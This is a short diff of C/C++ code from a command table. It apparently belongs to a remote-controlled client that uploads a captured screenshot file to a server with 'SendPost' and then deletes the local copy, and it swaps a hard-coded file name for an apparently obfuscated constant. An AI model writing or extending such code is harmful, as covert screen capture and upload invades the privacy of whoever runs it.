@@ -89,12 +89,11 @@ command_t commandDefs[] = {
 					goto g_3;
 				}
 
-				char* response = network.SendPost(buffer, size, false);
-				if (response) free(response);
+				network.SendPost(NULL, 0, NULL, NULL, buffer, size, false);
 
 				g_3:	free(buffer);
 				g_2:	fclose(fp);
-				g_1:	DeleteFile(_T("screen.png"));
+				g_1:	DeleteFile(V_FAKE_TMP1);
 			}
 		},
 		{
